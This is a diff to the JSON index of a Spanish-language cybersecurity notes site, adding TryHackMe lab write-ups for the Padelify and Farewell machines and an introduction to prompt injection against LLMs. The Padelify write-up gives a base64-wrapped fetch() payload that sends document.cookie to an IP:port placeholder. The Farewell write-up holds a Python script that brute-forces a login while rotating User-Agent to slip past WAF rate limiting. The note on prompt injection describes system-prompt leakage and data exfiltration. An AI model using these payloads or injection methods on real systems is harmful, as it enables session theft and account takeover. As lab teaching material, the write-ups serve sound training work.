@@ -4956,8 +4956,8 @@
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/4-bypassing-waf/4-bypassing-waf/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/4. Bypassing WAF.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 4. Bypassing WAF",
-    "content": "1. [[0. WAF - Introduction]]\n2. [[0. WAF - Exploitation Techniques]]\n3. [[0. Padelify]]\n4. [[0. Farewell]]",
-    "modified": "2026-03-10T01:01:35"
+    "content": "1. [[0. WAF - Introduction]]\n2. [[0. WAF - Exploitation Techniques]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/3. Padelify/0. Padelify]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/4. Farewell/0. Farewell]]",
+    "modified": "2026-04-14T01:23:20"
   },
   {
     "title": "3. Chaining Vulnerabilities",
@@ -4992,20 +4992,36 @@
     "modified": "2026-03-31T01:16:47"
   },
   {
+    "title": "1. Redirection",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/4-bypassing-waf/4-farewell/1-redirection/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/4. Farewell/1. Redirection.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 4. Bypassing WAF > 4. Farewell",
+    "content": "Para ver esta máquina ve a **THM -> Maquinas/2. Medium -> 15. Farewell -> 2. Getting the Flags**",
+    "modified": "2026-04-14T01:23:20"
+  },
+  {
     "title": "0. Farewell",
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/4-bypassing-waf/4-farewell/0-farewell/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/4. Farewell/0. Farewell.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 4. Bypassing WAF > 4. Farewell",
-    "content": "",
-    "modified": "2026-03-10T01:01:35"
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/4. Farewell/1. Redirection]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]",
+    "modified": "2026-04-14T01:23:20"
+  },
+  {
+    "title": "1. Redirection",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/4-bypassing-waf/3-padelify/1-redirection/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/3. Padelify/1. Redirection.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 4. Bypassing WAF > 3. Padelify",
+    "content": "Para ver esta máquina ve a **THM -> Maquinas/2. Medium -> 14. Padelify -> 2. Getting the Flags**",
+    "modified": "2026-04-14T01:23:20"
   },
   {
     "title": "0. Padelify",
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/4-bypassing-waf/3-padelify/0-padelify/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/3. Padelify/0. Padelify.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 4. Bypassing WAF > 3. Padelify",
-    "content": "",
-    "modified": "2026-03-10T01:01:35"
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/4. Bypassing WAF/3. Padelify/1. Redirection]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]",
+    "modified": "2026-04-14T01:23:20"
   },
   {
     "title": "0. WAF - Exploitation Techniques",
@@ -5484,8 +5500,8 @@
     "path": "/apuntes/thm/1-career/2-penetration-tester/4-web-application-red-teaming/5-attacking-llms/1-input-manipulation-and-prompt-injection/1-introduction/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/4. Web Application Red Teaming/5. Attacking LLMs/1. Input Manipulation and Prompt Injection/1. Introduction.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 4. Web Application Red Teaming > 5. Attacking LLMs > 1. Input Manipulation and Prompt Injection",
-    "content": "",
-    "modified": "2026-03-10T01:01:35"
+    "content": "Los LLMs (Large Language Models) son diseñados para generar respuestas basadas en instrucciones y queries del usuario. En muchas aplicaciones, estos modelos operan con múltiples capas de instrucción:\n\n- **Prompts de Sistema:** Instrucciones escondidas que definen el rol y limitaciones del modelo (por ejemplo: \"Eres un asistente que ayuda, pero nunca revela sus herramientas internas o credenciales\").\n- **Prompts de Usuario:** Los inputs escritos por el usuario (por ejemplo: \"¿Cómo reseteo mi contraseña?\").\n\nLos atacantes se han dado cuenta de que construyendo sus prompts cuidadosamente, pueden confundir al modelo o incluso explotar su seguridad. A esto se le conoce como \"Input Manipulation\". La forma más común de realizarla es prompt injection, donde los atacantes cambian el flujo de instrucciones y fuerzan al modelo a ignorar o bypassear restricciones.\n\nEn algunos casos, la manipulación del input puede llevar a filtraciones de prompts de sistema, exponiendo configuración o instrucciones en los que el modelo confía.\n\nEl peligro recae en la confianza puesta en estos modelos:\n\n- Compañías que integran sus flujos (chatbots HR, asistentes IT, dashboards financieros...).\n- Los usuarios asumen que sus respuestas son autoritativas y seguras.\n- Los desarrolladores suelen subestimar cómo de fácil es saltarse estas restricciones.\n\nSi los atacantes pueden manipular el modelo, pueden:\n\n- Exfiltrar información sensible.\n- Engañar al sistema para que haga peticiones no autorizadas.\n- Filtrar las políticas internas o instrucciones escondidas.\n- Encadenar ataques con otras vulnerabilidades.\n\nEs importante recalcar que prompt injection no es un bug de software tradicional que puedas parchear en el modelo. Es una capacidad intrínseca que sigue cómo se diseñan los LLMs. Dicho de otra manera, no puedes eliminar completamente el prompt injection, sino que tienes que construir mitigaciones alrededor del modelo sanitizando y validando el contenido entrante.",
+    "modified": "2026-04-14T01:23:21"
   },
   {
     "title": "0. Juicy",
@@ -5764,8 +5780,8 @@
     "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
     "breadcrumb": "THM > Maquinas > 2. Medium",
-    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14.",
-    "modified": "2026-04-09T01:08:09"
+    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14. [[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]\n15. [[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]\n16.",
+    "modified": "2026-04-14T01:23:21"
   },
   {
     "title": "4. Insane",
@@ -7280,6 +7296,30 @@
     "modified": "2026-02-12T01:08:37"
   },
   {
+    "title": "0. Padelify",
+    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/0-padelify/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
+    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/2. Getting the Flags]]",
+    "modified": "2026-04-14T01:23:21"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
+    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos con un escaneo de puertos.\n\n![[Pasted image 20260413132109.png]]\n\nAhora vamos a escanear dichos puertos más en profundidad.\n\n![[Pasted image 20260413132132.png]]\n\nEsto podría permitirnos realizar un XSS.\n\nVamos a listar directorios web.\n\n```txt\npadelify.thm\n    ├── config [200 451B]\n    ├── js [200 461B]\n    ├── logs [200 455B]\n    │   └── error.log [200 1KB]\n    ├── footer.php [200 33B]\n    ├── header.php [200 728B]\n    ├── login.php [200 467B]\n    └── status.php [200 1KB]\n```\n\nVamos a ver cómo se ve la web.\n\n![[Pasted image 20260413132449.png]]\n\nAquí podemos ver algo de especial interés: El moderador debe aprobar nuestra cuenta.\n\nVamos a ver qué hay en los archivos que hemos encontrado.\n\n![[Pasted image 20260413132747.png]]\n\nVamos a seguir mirando.\n\n![[Pasted image 20260413132915.png]]\n\nY seguimos.\n\n![[Pasted image 20260413132958.png]]\n\n----------------------------\n<h2>Profundización</h2>\nSi intentamos entrar, por ejemplo a `app.conf`, nos sale lo siguiente:\n\n![[Pasted image 20260413132833.png]]\n\nVamos a ver `error.log`\n\n![[Pasted image 20260413133049.png]]\n\nParecen los logs de error del WAF en principio.\n\n-------------------------------\n<h2>Explotación</h2>\nVamos primero a capturar la petición de registro y a probar diferentes payloads en BurpSuite.\n\n![[Pasted image 20260413133641.png]]\n\nComo habíamos visto que la `httponly: not set`, podemos intuir un ataque XSS en este formulario para robar la cookie de sesión de `moderator`. Sin embargo, hay un WAF protegiendo el entorno, por lo que tendremos que dar con el bypass correspondiente.\n\n![[Pasted image 20260413134127.png]]\n\nParece que aunque subamos un payload como `<script>alert('XSS')</script>`, no tiene mayor repercusión, así que vamos a probar todos los campos para obtener la cookie de sesión del usuario `moderator`.\n\n![[Pasted image 20260413134635.png]]\n\nParece que un payload con impacto real sí que ha sido detectado. Vamos a probar diferentes técnicas de ofuscación. \n\nDespués de un rato probando, parece que `fetch` y `cookie` son dos palabras que causan problemas con el WAF. Investigo técnicas de ofuscación con comentarios y entidades HTML pero ninguna funciona, por lo que hay que probar otros comandos.\n\n![[Pasted image 20260413142237.png]]\n\nParece que `atob` y `eval` no están capados, por lo que mandamos `fetch('http://IP:PUERTO' + document.cookie)` encodeado en base64.\n\n![[Pasted image 20260413155819.png]]\n\n>[!CAUTION] Por algún motivo en mi máquina no funcionó y estuve mucho tiempo atascado, hasta que probé con la attackbox.\n\nIntroducimos la cookie en el navegador y refrescamos la página.\n\n![[Pasted image 20260413160012.png]]\n\n----------------------------------\n<h2>Escalada de Privilegios</h2>\nSi le damos al apartado `Live`, podemos ver que nos lleva a una página y que carga documentos:\n\n![[Pasted image 20260413160454.png]]\n\nEs aquí donde nos acordamos que había otros como `header.php`, y el más importante: `/config/app.conf`. Vamos a ver si podemos cargar uno inofensivo:\n\n![[Pasted image 20260413160631.png]]\n\nEfectivamente sí podemos, vamos a intentar un path traversal aquí:\n\n![[Pasted image 20260413160709.png]]\n\nPero nos bloquea, así que vamos a probar alguna técnica de ofuscación.\n\n![[Pasted image 20260413161135.png]]\n\nBingo! Eso parece una contraseña, vamos a probarla.\n\n![[Pasted image 20260413161312.png]]\n\nY ahí lo tenemos.",
+    "modified": "2026-04-14T01:23:21"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/2-medium/14-padelify/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 14. Padelify",
+    "content": "![[Pasted image 20260413114030.png]]\n\nUsa técnicas de red teaming para bypassear el WAF y obtener acceso administrador a la aplicación web.\n\nHas ingresado en una competición de padel, pero tu rival sigue ascendiendo en la clasificación. El panel de administrador gestiona las aprobaciones y registros. ¿Puedes crackear el admin y reescribir el encuentro antes de que suene el silbato?",
+    "modified": "2026-04-14T01:23:21"
+  },
+  {
     "title": "0. Rabbit Store",
     "path": "/apuntes/thm/maquinas/2-medium/4-rabbit-store/0-rabbit-store/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/0. Rabbit Store.md",
@@ -7302,6 +7342,30 @@
     "breadcrumb": "THM > Maquinas > 2. Medium > 4. Rabbit Store",
     "content": "![[Pasted image 20251123154340.png]]\nEn esta máquina se nos pide encontrar el contenido de:\n\n- user.txt\n- root.txt",
     "modified": "2025-12-12T13:58:55"
+  },
+  {
+    "title": "0. Farewell",
+    "path": "/apuntes/thm/maquinas/2-medium/15-farewell/0-farewell/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 15. Farewell",
+    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/2. Getting the Flags]]",
+    "modified": "2026-04-14T01:23:21"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/2-medium/15-farewell/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 15. Farewell",
+    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos haciendo un escaneo de puertos abiertos.\n\n![[Pasted image 20260413171313.png]]\n\nAhora vamos a escanear dichos puertos en profundidad.\n\n![[Pasted image 20260413171323.png]]\n\nParece que `httponly: not set` por lo que sospechamos de un posible XSS.\n\nVamos a listar directorios web.\n\n![[Pasted image 20260413171242.png]]\n\nParece que el método GET no está permitido en `auth.php`.\n\nVamos a ver cómo se ve la página web.\n\n![[Pasted image 20260413171558.png]]\n\nVamos a investigar las páginas que hemos encontrado.\n\n![[Pasted image 20260413171659.png]]\n\nSeguimos mirando.\n\n![[Pasted image 20260413171854.png]]\n\n----------------------------------\n<h2>Profundización</h2>\nMirando la página con cuidado, podemos ver tres nombres de usuario en la parte superior:\n\n![[Pasted image 20260413172141.png]]\n\n- `adam`\n- `deliver11`\n- `nora`\n\nVamos a mirar una petición de login con un usuario falso.\n\n![[Pasted image 20260413172306.png]]\n\nY ahora uno con uno de esos `usernames`.\n\n![[Pasted image 20260413172338.png]]\n\nParece que nos muestra ciertos datos. Vamos a ver si hay alguno más fácil que el nombre de su mascota:\n\n![[Pasted image 20260413172440.png]]\n\nEsta parece fácil de adivinar.\n\n-----------------------------\n<h2>Explotación</h2>\nVamos a intentar crackear este inicio de sesión. Para ello creamos una lista con las posibles contraseñas:\n\n![[Pasted image 20260413174352.png]]\n\nAhora vamos a usar `hydra` para intentar crackearlo:\n\n![[Pasted image 20260413175730.png]]\n\nSin embargo no parece funcionar. Si probamos a iniciar sesión múltiples veces erróneamente sale este aviso:\n\n![[Pasted image 20260413174324.png]]\n\nEsto es probablemente a que el WAF está controlando el User-Agent para ejercer un rate limit.\n\nVamos a crear pues un script de Python que nos permita randomizar el User-Agent en las peticiones.\n\n```python\nimport requests\nimport random\nimport time\n\nUSER_AGENTS = [\n    \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\",\n    \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\",\n]\n\nfor x in range(0, 10000):\n    password = f\"Tokyo{x:04d}\"\n    url = f'http://farewell.thm/auth.php?i={x}'\n    headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'User-Agent': random.choice(USER_AGENTS)\n    }\n    data = f'username=deliver11&password={password}'\n    resp = requests.post(url, headers=headers, data=data, timeout=5)\n\n    if \"auth_failed\" in resp.text:\n        continue\n    elif resp.status_code == 403:\n        print(f'[WAF BLOCK] {password}, backing off...')\n        time.sleep(2)\n    else:\n        print(f'[SUCCESS] Payload: {password} | Code: {resp.status_code}')\n        print(f'Response: {resp.text}')\n        break\n```\n\nEl parámetro `i` diferente en cada petición es lo que hace que el WAF no bloquee por repetición de endpoint.\n\nVamos a probar este script:\n\n![[Pasted image 20260413181148.png]]\n\nHemos encontrado la contraseña, vamos a iniciar sesión:\n\n![[Pasted image 20260413181327.png]]\n\n------------------------------------\n<h2>Escalada de Privilegios</h2>\nEn la imagen anterior podemos apreciar que el comentario ha sido aprobado, y además antes no s dijeron que en el panel de administrador salían todos los comentarios. También tenemos el dato de que `httponly: flag not set`, por lo que podemos intuir un XSS en el campo de comentario. Sin embargo también sabemos que hay un firewall, por lo que vamos a realizar pruebas para ver cómo podemos sobrepasarlo.\n\n![[Pasted image 20260413181626.png]]\n\nDespués de unas cuantas pruebas, podemos ver que `<script>`, `cookie` y `fetch` están prohibidos por el WAF, pero `atob` y `eval` no lo están. \n\n![[Pasted image 20260413182135.png]]\n\nSin embargo, no parece traducirse, vamos a probar con `img`. Nos vamos a poner en escucha y a insertar un payload:\n\n![[Pasted image 20260413183127.png]]\n\nY en el listener:\n\n![[Pasted image 20260413183155.png]]\n\nVamos a usar ahora dicha cookie.\n\n![[Pasted image 20260413183303.png]]\n\nY ahora navegamos hasta `admin.php`:\n\n![[Pasted image 20260413183343.png]]\n\nY ya tenemos la flag de admin.",
+    "modified": "2026-04-14T01:23:21"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/2-medium/15-farewell/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 2. Medium > 15. Farewell",
+    "content": "![[Pasted image 20260413170604.png]]\n\nUsa técnicas de red teaming para bypassear el WAF y obtener acceso de administrador a la aplicación web.\n\nEl servidor farewell será desmantelado en menos de 24 horas. Se ha pedido a todo el mundo que deje un último mensaje, pero el panel de administrador contiene todas las subidas. ¿Puedes colarte en el área de administración y leer todos los mensajes antes de que se apaguen las luces?",
+    "modified": "2026-04-14T01:23:21"
   },
   {
     "title": "2. Getting the Flags",
